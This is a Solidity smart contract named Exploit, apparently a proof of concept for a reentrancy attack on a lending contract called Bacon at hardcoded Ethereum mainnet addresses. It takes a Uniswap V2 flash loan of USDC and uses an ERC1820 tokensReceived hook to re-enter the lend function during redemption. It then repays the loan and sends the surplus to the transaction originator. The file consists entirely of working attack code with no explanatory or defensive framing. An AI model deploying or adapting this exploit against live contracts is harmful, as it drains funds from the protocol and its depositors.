//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface ERC1820Registry {
    function setInterfaceImplementer(
        address _addr,
        bytes32 _interfaceHash,
        address _implementer
    ) external;
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface IBacon {
    function lend(uint index) external;
    function redeem(uint index) external;
    function balanceOf(address account) external view returns (uint256);
}
interface IERC20 {
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function decimals() view external returns (uint8);
}
contract Exploit {

    IUniswapV2Pair pair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBacon bacon = IBacon(0xb8919522331C59f5C16bDfAA6A121a6E03A91F62);
    uint256 count = 0;

    constructor(){
        ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer(address(this),bytes32(0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b),address(this));
    }

    function attack() public{

        pair.swap(6360000000000,0,address(this),new bytes(1));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public{
        usdc.approve(address(bacon),10000000000000000000);
        bacon.lend(2120000000000);
        bacon.redeem(bacon.balanceOf(address(this)));
        usdc.transfer(msg.sender,(amount0/997*1000)+10**usdc.decimals());
        usdc.transfer(tx.origin,usdc.balanceOf(address(this)));
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata data,
        bytes calldata operatorData
    ) public{
        count+=1;
        if(count<=2){
            bacon.lend(2120000000000);
        }
    }
}
